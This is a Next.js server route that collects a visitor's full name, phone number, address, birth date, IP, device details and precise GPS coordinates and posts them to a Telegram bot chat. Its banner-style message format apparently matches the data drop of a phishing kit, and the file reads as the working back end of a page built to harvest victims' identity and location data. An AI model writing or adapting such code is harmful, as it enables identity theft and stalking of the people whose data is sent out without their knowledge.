import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const { fullName, phoneNumber, address, city, country, postalCode, dateOfBirth, deviceInfo, locationInfo, ipInfo } =
      await request.json()

    // Telegram Bot configuration
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error("Telegram credentials not configured")
      return NextResponse.json({ success: false, error: "Configuration error" })
    }

    // Split full name into first and last name
    const nameParts = fullName.trim().split(" ")
    const firstName = nameParts[0] || ""
    const lastName = nameParts.slice(1).join(" ") || ""

    let message = `~~~~[ 𝗣𝗘𝗥𝗦𝗢𝗡𝗔𝗟 𝗜𝗡𝗙𝗢 ]~~~~
𝗙𝗶𝗿𝘀𝘁 𝗡𝗮𝗺𝗲: ${firstName}
𝗟𝗮𝘀𝘁 𝗡𝗮𝗺𝗲: ${lastName}
𝗔𝗱𝗱𝗿𝗲𝘀𝘀: ${address}
𝗖𝗶𝘁𝘆: ${city}
𝗦𝘁𝗮𝘁𝗲/𝗣𝗿𝗼𝘃𝗶𝗻𝗰𝗲: ${ipInfo?.region || "Unknown"}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: ${country}
𝗭𝗜𝗣/𝗣𝗼𝘀𝘁𝗮𝗹: ${postalCode}
𝗕𝗶𝗿𝘁𝗵𝗗𝗮𝘆: ${dateOfBirth}
𝗣𝗵𝗼𝗻𝗲: ${phoneNumber}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: ${country}
~~~~[ 𝗘𝗡𝗗 𝗢𝗙 𝗟𝗜𝗡𝗘 ]~~~~

~~~~[ 𝗕𝗥𝗢𝗪𝗦𝗘𝗥 𝗜𝗡𝗙𝗢 ]~~~~
𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: ${ipInfo?.ip || "Unknown"}
𝗥𝗲𝗴𝗶𝗼𝗻: ${ipInfo?.region || "Unknown"}
𝗖𝗶𝘁𝘆: ${ipInfo?.city || "Unknown"}
𝗖𝗼𝗻𝘁𝗶𝗻𝗲𝗻𝘁: ${getContinent(ipInfo?.countryCode) || "Unknown"}
𝗧𝗶𝗺𝗲𝘇𝗼𝗻𝗲: ${ipInfo?.timezone || deviceInfo?.timezone || "Unknown"}
𝗢𝗦/𝗕𝗿𝗼𝘄𝘀𝗲𝗿: ${deviceInfo?.os || "Unknown"}/${deviceInfo?.browser || "Unknown"}
𝗗𝗮𝘁𝗲: ${new Date().toLocaleString()}
𝗨𝘀𝗲𝗿 𝗔𝗴𝗲𝗻𝘁: ${deviceInfo?.userAgent || "Unknown"}
~~~~[ 𝗘𝗡𝗗 𝗢𝗙 𝗟𝗜𝗡𝗘 ]~~~~`

    // Add GPS coordinates if available
    if (locationInfo && locationInfo.latitude && locationInfo.longitude) {
      message += `

🎯 GPS: ${locationInfo.latitude.toFixed(6)}, ${locationInfo.longitude.toFixed(6)}
🗺️ Maps: https://maps.google.com/?q=${locationInfo.latitude},${locationInfo.longitude}`
    }

    // Add continent helper function
    function getContinent(countryCode: string): string {
      const continents: { [key: string]: string } = {
        US: "North America",
        CA: "North America",
        MX: "North America",
        GB: "Europe",
        DE: "Europe",
        FR: "Europe",
        IT: "Europe",
        ES: "Europe",
        AU: "Oceania",
        NZ: "Oceania",
        JP: "Asia",
        CN: "Asia",
        IN: "Asia",
        BR: "South America",
        AR: "South America",
        ZA: "Africa",
        EG: "Africa",
        // Add more as needed
      }
      return continents[countryCode] || "Unknown"
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (response.ok) {
      return NextResponse.json({ success: true })
    } else {
      console.error("Failed to send to Telegram:", await response.text())
      return NextResponse.json({ success: false, error: "Failed to send message" })
    }
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return NextResponse.json({ success: false, error: "Server error" })
  }
}
